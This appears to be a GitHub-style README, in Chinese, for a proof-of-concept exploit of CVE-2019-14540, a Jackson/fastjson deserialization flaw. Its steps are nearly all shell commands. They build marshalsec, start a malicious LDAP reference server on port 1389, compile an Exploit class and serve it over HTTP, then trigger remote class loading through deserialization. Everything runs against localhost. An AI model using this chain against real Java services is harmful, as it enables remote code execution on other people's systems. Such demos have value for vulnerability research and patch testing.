# CVE-2019-14540 Exploit

[http://www.leadroyal.cn/?p=939](http://www.leadroyal.cn/?p=939)

环境限制：因为本demo使用 jndi 的 ldap 利用方式，需要使用低版本（小于8u191）的 jdk。

### 1. 使用marshalsec，在本地1389端口创建 ldap 服务，指向本地8000的 http 服务

```
git clone https://github.com/mbechler/marshalsec.git
mvn package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#Exploit" 1389
```

### 2. 在 remote_codebase 里编译用于远程加载的代码

```
cd remote_codebase
javac Exploit.java
```

### 3. 在 remote_codebase 里开启本地8000的 http 服务

```
cd remote_codebase
python -m SimpleHTTPServer
```

### 4. 运行 Main.java，使用 jackson 和 fastjson 反序列化触发漏洞

![demo.png](demo.png)